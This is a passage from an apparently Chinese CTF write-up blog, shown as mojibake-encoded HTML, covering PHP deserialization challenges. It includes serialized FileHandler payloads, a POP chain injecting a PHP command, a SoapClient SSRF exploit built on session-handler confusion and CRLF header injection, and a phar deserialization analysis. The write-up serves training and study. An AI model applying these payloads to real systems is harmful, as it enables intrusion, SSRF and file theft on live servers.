å‡½æ•°å’Œååºåˆ—åŒ–å‡½æ•°çŸ¥é“è€ƒå¯Ÿåºåˆ—åŒ–"></a>1.å‘ç°æ„é€ å‡½æ•°å’Œååºåˆ—åŒ–å‡½æ•°çŸ¥é“è€ƒå¯Ÿåºåˆ—åŒ–</h3><h3 id="2-ä»£ç å®¡è®¡å¾—åˆ°å¤§è‡´æµç¨‹-1"><a href="#2-ä»£ç å®¡è®¡å¾—åˆ°å¤§è‡´æµç¨‹-1" class="headerlink" title="2.ä»£ç å®¡è®¡å¾—åˆ°å¤§è‡´æµç¨‹"></a>2.ä»£ç å®¡è®¡å¾—åˆ°å¤§è‡´æµç¨‹</h3><p>ä¼ å‚strâ†’is_valid()å‡½æ•°è¿‡æ»¤â†’unserialize()å‡½æ•°è§¦å‘destruct()å‡½æ•°ï¼šåˆ¤æ–­opâ†’è°ƒç”¨process()å‡½æ•°ï¼Œopä¸º2æ—¶â†’è°ƒç”¨read()å‡½æ•°</p><h3 id="3-payload-1"><a href="#3-payload-1" class="headerlink" title="3.payload"></a>3.payload</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot; 2&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br><span class="line"></span><br><span class="line">ä¸ä¿®æ”¹å±æ€§ï¼Œä½¿ç”¨å¤§S</span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;S:<span class="number">5</span>:<span class="string">&quot;\00*\00op&quot;</span>;i:<span class="number">2</span>;S:<span class="number">11</span>:<span class="string">&quot;\00*\00filename&quot;</span>;S:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;S:<span class="number">10</span>:<span class="string">&quot;\00*\00content&quot;</span>;S:<span class="number">7</span>:<span class="string">&quot;N;&#125;</span></span><br></pre></td></tr></table></figure><h4 id="ï¼ˆ1ï¼‰opçš„å€¼-1"><a href="#ï¼ˆ1ï¼‰opçš„å€¼-1" class="headerlink" title="ï¼ˆ1ï¼‰opçš„å€¼"></a>ï¼ˆ1ï¼‰opçš„å€¼</h4><p>å¯ä»¥ä¸ºâ€™   2â€™å’Œ2æ¥ä½¿destruct()ä¸­çš„ä¸æˆç«‹</p><p><img src="https://khaz.top/typora/images/image-20220403152704038.png" alt="image-20220403152704038"></p><p>ç»•è¿‡process()çš„</p><p><img src="https://khaz.top/typora/images/image-20220403152748861.png" alt="image-20220403152748861"></p><h4 id="ï¼ˆ2ï¼‰æˆå‘˜æ”¹ä¸ºpublic-x2F-ä½¿ç”¨å¤§S-1"><a href="#ï¼ˆ2ï¼‰æˆå‘˜æ”¹ä¸ºpublic-x2F-ä½¿ç”¨å¤§S-1" class="headerlink" title="ï¼ˆ2ï¼‰æˆå‘˜æ”¹ä¸ºpublic&#x2F;ä½¿ç”¨å¤§S"></a>ï¼ˆ2ï¼‰æˆå‘˜æ”¹ä¸ºpublic&#x2F;ä½¿ç”¨å¤§S</h4><p><img src="https://khaz.top/typora/images/image-20220403152827512.png" alt="image-20220403152827512"></p><p>1.åªå…è®¸å¯æ‰“å°å­—ç¬¦ï¼Œè€ŒåŸå…ˆæ˜¯protectedç±»å‹ï¼Œåºåˆ—åŒ–ä»¥åä¼šæœ‰ä¸å¯æ‰“å°å­—ç¬¦%00</p><p>è€ŒæŸ¥è¯¢å¾—çŸ¥åœ¨ PHP7.2+çš„ç¯å¢ƒä¸­ï¼Œä½¿ç”¨ public ä¿®é¥°æˆå‘˜å¹¶åºåˆ—åŒ–ï¼Œååºåˆ—åŒ–åæˆå‘˜ä¹Ÿä¼šè¢« public è¦†ç›–ä¿®é¥°ã€‚</p><p>2.protectedå±æ€§åºåˆ—åŒ–ä¼šå¼•å…¥\00<em>\00ã€‚ä½†æ˜¯\00æ˜¯ä¸å¯æ‰“å°å­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨åºåˆ—åŒ–å†…å®¹ä¸­ç”¨å¤§å†™Sè¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œæ­¤æ—¶è¿™ä¸ªå­—ç¬¦ä¸²å°±æ”¯æŒå°†åé¢çš„å­—ç¬¦ä¸²ç”¨16è¿›åˆ¶è¡¨ç¤ºã€‚å³æ‰‹åŠ¨å°†\00</em>\00å˜ä¸º\x00*\x00</p><h2 id="2022DASCTF-X-SU-ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ›ezpop-1"><a href="#2022DASCTF-X-SU-ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ›ezpop-1" class="headerlink" title="2022DASCTF X SU ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ›ezpop"></a>2022DASCTF X SU ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ›ezpop</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fin::<span class="title function_ invoke__">__destrcut</span>()â†’what::<span class="title function_ invoke__">__tostring</span>()â†’mix::<span class="title function_ invoke__">__run</span>()â†’crow::<span class="title function_ invoke__">__invoke</span>()â†’fin::<span class="title function_ invoke__">__call</span>()â†’mix::<span class="title function_ invoke__">__get_flag</span>()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$fin</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$crow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">crow</span>();</span><br><span class="line"><span class="variable">$what</span> = <span class="keyword">new</span> <span class="title function_ invoke__">what</span>();</span><br><span class="line"><span class="variable">$mix</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$mix2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"><span class="variable">$fin2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#é‡å¤ç”¨åˆ°äº†fin-&gt;f1å’Œmin-&gt;m1ï¼Œæ‰€ä»¥æœ‰$mix2 = new mix();$fin2 = new fin();</span></span><br><span class="line"><span class="variable">$fin</span>-&gt;f1 = <span class="variable">$what</span>;</span><br><span class="line"><span class="variable">$what</span>-&gt;a = <span class="variable">$mix</span>;</span><br><span class="line"><span class="variable">$mix</span>-&gt;m1 = <span class="variable">$crow</span>;</span><br><span class="line"><span class="variable">$crow</span>-&gt;v1 = <span class="variable">$fin2</span>;</span><br><span class="line"><span class="variable">$fin2</span>-&gt;f1 = <span class="variable">$mix2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$mix2</span>-&gt;m1 = <span class="string">&quot;?&gt;&lt;?php echo `ls`;?&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$fin</span>);</span><br></pre></td></tr></table></figure><h4 id="buuâ€“bestphpâ€˜s-revenge"><a href="#buuâ€“bestphpâ€˜s-revenge" class="headerlink" title="buuâ€“bestphpâ€˜s revenge"></a>buuâ€“bestphpâ€˜s revenge</h4><p>flag.phpï¼ˆç›®å½•æ‰«æå¾—åˆ°ï¼‰</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">only localhost can get flag!</span><br><span class="line"><span class="title function_ invoke__">session_start</span>(); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;only localhost can get flag!&#x27;</span>; </span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)</span><br><span class="line">&#123; <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>] = <span class="variable">$flag</span>; &#125; </span><br><span class="line">only localhost can get flag! </span><br></pre></td></tr></table></figure><blockquote><p>æœ¬åœ°è¯·æ±‚è®¿é—®flag.phpæ—¶ï¼Œä¼šå°†flagå†™å…¥sessionä¸­</p><p>åˆ©ç”¨phpåŸç”Ÿç±»SoapClientå¯ä»¥æ„é€ ssrfï¼Œéœ€è¦è§¦å‘SoapClient::callã€‚</p></blockquote><p>SoapClientï¼š</p><p><a href="https://www.anquanke.com/post/id/153065#h2-1">https://www.anquanke.com/post/id/153065#h2-1</a></p><p><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html</a></p><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>], <span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="title function_ invoke__">reset</span>(<span class="variable">$_SESSION</span>), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$b</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>ä¸Šé¢æåˆ°äº†è¦è§¦å‘SoapClient::callã€‚é‚£ä¹ˆå“ªé‡Œå¯ä»¥å®ä¾‹åŒ–SoapClientå¯¹è±¡å‘¢ï¼Ÿ</p><blockquote><p>ç­”æ¡ˆæ˜¯åœ¨sessionä¸­å®ä¾‹åŒ–ã€‚<a href="https://xz.aliyun.com/t/6640#toc-5">https://xz.aliyun.com/t/6640#toc-5</a></p></blockquote><p><img src="/../images/20191026142328-1fba974c-f7b9-1-1687419234886.png" alt="img"></p><p>$_SESSIONç¯å¢ƒå˜é‡å’ŒæœåŠ¡å™¨ä¸Šçš„seissionæ–‡ä»¶</p><blockquote><p>$_SESSIONç¯å¢ƒå˜é‡ï¼šä¿å­˜å®ä¾‹åŒ–å¯¹è±¡</p><p>åœ¨ä¼šè¯ç»“æŸåå°†æ•°æ®åºåˆ—åŒ–ä¿å­˜åˆ°seissionæ–‡ä»¶ä¸­ã€‚</p><p>ä¼šè¯å¼€å§‹åï¼Œä¼šæ ¹æ®cookieä¸­çš„phpsession_idå°†sessionæ–‡ä»¶ï¼ˆå¦‚æœæœ‰ï¼‰çš„å†…å®¹ååºåˆ—åŒ–ä¿å­˜åˆ°$_SESSIONç¯å¢ƒå˜é‡ä¸­ã€‚</p></blockquote><p>åºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">  <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;khaz^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,</span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$aaa</span>);</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡ï¼Œæ›´æ”¹phpçš„sessionå¼•æ“ï¼Œé€šè¿‡åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ—¶å¼•æ“çš„ä¸åŒä½¿ä¸‹ä¸€æ¬¡è¯·æ±‚æ—¶sessionä¸­ä¿å­˜çš„æ˜¯æˆ‘ä»¬æ„é€ çš„SoapClientå¯¹è±¡ã€‚</p><p><img src="/../images/image-20220730203810430-1687419234886.png" alt="image-20220730203810430"></p><blockquote><p>POST ï¼šserialize_handler&#x3D;php_serialize</p><p>GET    :   f&#x3D;session_start</p><p><code>call_user_func($_GET[&#39;f&#39;], $_POST);</code>å°†sessionå¼•æ“è®¾ç½®ä¸ºphp_serializeï¼ˆåœ¨ä¸‹ä¸€æ¬¡ä¸­ç”Ÿæ•ˆï¼‰</p></blockquote><p>æ³¨ï¼šä½¿ç”¨session_startè®¾ç½®å¼•æ“ï¼Œè€Œä¸æ˜¯ç”¨ini_setæ¥è®¾ç½®ï¼Œå› ä¸ºsession_startèƒ½å¤Ÿå¤„ç†æ•°ç»„ï¼Œè€Œini_setä¸è¡Œ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>(<span class="title function_ invoke__">arrary</span>(<span class="string">&#x27;serialize_handler&#x27;</span>=&gt;<span class="string">&#x27;php_serialize&#x27;</span>))</span><br></pre></td></tr></table></figure><blockquote><p>GET:   name&#x3D; |+åºåˆ—åŒ–å†…å®¹ï¼ˆè®°å¾—åœ¨å‰é¢åŠ ä¸Š|ï¼‰</p><p>$_SESSION[â€˜nameâ€™] &#x3D; $_GET[â€˜nameâ€™];</p><p>è¿™æ—¶å€™sessionæ–‡ä»¶ä¸­ä¿å­˜çš„æ•°æ®å°±æ˜¯ä¸Šå›¾responseä¸­çš„ã€‚</p></blockquote><p>ç¬¬äºŒæ¬¡ï¼Œè¿˜æ˜¯ä¸Šä¸€æ¬¡çš„cookieï¼Œé€šè¿‡è¦†ç›–å˜é‡è§¦å‘SoapClient::callæ–¹æ³•</p><p><img src="/../images/image-20220730204831558-1687419234886.png" alt="image-20220730204831558"></p><blockquote><p>ä¸ä¸Šä¸€æ¬¡ç›¸åŒçš„cookieï¼ŒæœåŠ¡å™¨å°±ä¼šæ ¹æ®cookieæ‰¾åˆ°æˆ‘ä»¬æ„é€ çš„sessionæ–‡ä»¶ï¼Œå¹¶å°†å…¶å†…å®¹ååºåˆ—åŒ–ä¿å­˜åˆ°$_SESSIONä¸­ï¼Œæ­¤æ—¶å› ä¸ºå¼•æ“çš„ä¸åŒï¼Œååºåˆ—åŒ–åå¾—åˆ°çš„å°±æ˜¯æ„é€ å¥½çš„SoapClientå¯¹è±¡ã€‚</p></blockquote><p>è§¦å‘SoapClient::callæ–¹æ³•</p><blockquote><p>POST ï¼šb&#x3D;call_user_func</p><p>GET    :   f&#x3D;extract</p><p><code>call_user_func($_GET[&#39;f&#39;], $_POST);</code>å³<code>extract($_POST)</code>â†’b&#x3D;call_user_func</p><p><code>$a = array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);</code></p><p><code>call_user_func($b, $a);</code>å³</p><p><code>call_user_func(call_user_func, arrary(reset($_SESSION),&#39;welcome_to_the_lctf2018&#39;))</code></p><p>å³<code>call_user_funcï¼ˆarrary(reset($_SESSION),&#39;welcome_to_the_lctf2018&#39;)ï¼‰</code></p><p>å³è°ƒç”¨äº†reset($_SESSION)ä¸­çš„â€™welcome_to_the_lctf2018â€™æ–¹æ³•</p><p>è€Œreset($_SESSION)å³æ˜¯SoapClientå¯¹è±¡ï¼Œæ²¡æœ‰â€™welcome_to_the_lctf2018â€™æ–¹æ³•ï¼Œå°±è§¦å‘äº†SoapClient::callæ–¹æ³•,ä»è€Œå°†flagä¿å­˜åˆ°æˆ‘ä»¬æ„é€ çš„cookieæ‰€å¯¹åº”çš„sessionä¸­ã€‚</p></blockquote><p>ç¬¬ä¸‰æ¬¡ï¼Œå°†cookieè®¾ç½®ä¸ºæˆ‘ä»¬æ„é€ çš„cookieï¼Œè·å¾—å¯¹åº”çš„session</p><p><img src="/../images/image-20220730212228972-1687419234886.png" alt="image-20220730212228972"></p><h3 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</h3><p>æ‰“å¼€æ˜¯ç™»å½•é¡µé¢ï¼Œè¦ä¹ˆç›®æ ‡å°±æ˜¯ç™»å½•ä¸Šå»ï¼Œè¦ä¹ˆå°±æ˜¯ç™»å½•åçš„åŠŸèƒ½æœ‰é—®é¢˜ã€‚</p><p>å…ˆæ‰¾æ³¨å†Œç•Œé¢ï¼Œæœ‰æ³¨å†Œç•Œé¢ï¼Œé‚£åº”è¯¥å°±æ˜¯ç™»é™†åçš„åŠŸèƒ½æœ‰é—®é¢˜ã€‚</p><p>æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œä¸‹è½½ï¼Œåˆ é™¤åŠŸèƒ½ã€‚ç»æµ‹è¯•ï¼Œæ–‡ä»¶ä¸‹è½½éƒ¨åˆ†å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œé€šè¿‡æ­¤æ¼æ´å¾—åˆ°æºç ã€‚</p><hr><p>ä»£ç å®¡è®¡ï¼š</p><p>å› ä¸ºbuuä¸Šæœ‰pharæ ‡ç­¾ï¼Œæ‰€ä»¥çŸ¥é“è€ƒçš„æ˜¯pharã€‚</p><p>åç€æ‰¾ï¼Œå…ˆæ‰¾æ–‡ä»¶å‡½æ•°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span>.phpä¸‹</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line"></span><br><span class="line"><span class="title class_">File</span>::<span class="variable constant_">close</span>è°ƒç”¨äº†<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename)è§¦å‘pharååºåˆ—åŒ–</span><br><span class="line">æ‰€ä»¥è¦æ„é€ filename=flagæ‰€åœ¨è·¯å¾„</span><br></pre></td></tr></table></figure><p>å†çœ‹å“ªé‡Œè°ƒç”¨äº†closeæ–¹æ³•ï¼š</p><ol><li><p>download.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">21</span>,<span class="number">17</span>:     <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">ä½†æ˜¯è¿™é‡Œé™åˆ¶äº†ç›®å½•è®¿é—®å¹¶è¿‡æ»¤äº†flagï¼Œæ‰€ä»¥ä¸èƒ½åˆ©ç”¨</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>)</span><br></pre></td></tr></table></figure></li><li><p>class.php</p></li></ol><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">User</span>::<span class="variable constant_">destruct</span></span><br><span class="line"><span class="number">57</span>,<span class="number">20</span>:         <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">æ‰€ä»¥çŒœæµ‹è¦è®©<span class="variable">$db</span>ä¸ºFileå¯¹è±¡</span><br></pre></td></tr></table></figure><p>æ­£ç€æ‰¾</p><ol><li><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileList</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Name</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Size</span>();</span><br><span class="line">é¦–å…ˆå®ä¾‹åŒ–äº†FileListç±»ï¼Œç„¶åè°ƒç”¨äº†è¿™ä¸ªç±»ä¸­çš„Nameå’ŒSizeæ–¹æ³•ï¼Œä½†æ˜¯FileListç±»ä¸­æ²¡æœ‰è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨</span><br><span class="line">__callé­”æœ¯æ–¹æ³•</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥æ‰¾FileListç±»æ˜¯å¦æœ‰callæ–¹æ³•</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Filelist</span>::<span class="variable constant_">call</span>ï¼š</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">__callæ–¹æ³•çš„å‚æ•°<span class="variable">$func</span>æ˜¯è¢«è°ƒç”¨çš„ä¸å­˜åœ¨çš„æ–¹æ³•å</span><br><span class="line">å…³æ³¨<span class="variable">$file</span>-&gt;<span class="variable">$func</span>()ï¼Œè°ƒç”¨äº†<span class="variable">$func</span>()</span><br></pre></td></tr></table></figure></li><li><p>$fileæ˜¯ä»€ä¹ˆï¼šå¾€å‰çœ‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">    <span class="comment">//çŸ¥é“$fileæ˜¯Fileå¯¹è±¡</span></span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">    <span class="comment">//çŸ¥é“fileså­˜æ”¾pathä¸‹çš„æ‰€æœ‰æ–‡ä»¶å¯¹è±¡($filenames = scandir($path);)</span></span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line"> &#125;   </span><br></pre></td></tr></table></figure></li><li><p>å›çœ‹callæ–¹æ³•</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="comment">//results[æ–‡ä»¶å][æ–¹æ³•å]=File::$funcçš„ç»“æœ</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥Filelist::callå°±æ˜¯å½“Filelistå¯¹è±¡è°ƒç”¨çš„æ–¹æ³•ä¸åœ¨Filelistç±»æ—¶ï¼Œå°†è¯¥æ–¹æ³•ç”¨Fileç±»é‡è½½ï¼Œå¹¶æŠŠæ‰§è¡Œç»“æœä¿å­˜åˆ°Filelist.resultsä¸­ã€‚<br>æ‰€ä»¥å¦‚æœFilelistå¯¹è±¡è°ƒç”¨äº†closeæ–¹æ³•ï¼Œå°±ç›¸å½“äºè°ƒç”¨äº†File.close()ã€‚<br>æ‰€ä»¥$dbåº”è¯¥ä¸ºFilelistå¯¹è±¡ï¼Œè¿™æ ·å°±å¯ä»¥è°ƒç”¨File.close()</p></li><li><p>ç»§ç»­å‘ä¸‹çœ‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)ä¸­å…³æ³¨</span></span><br><span class="line"><span class="function"><span class="title">foreach</span> (<span class="params"><span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span 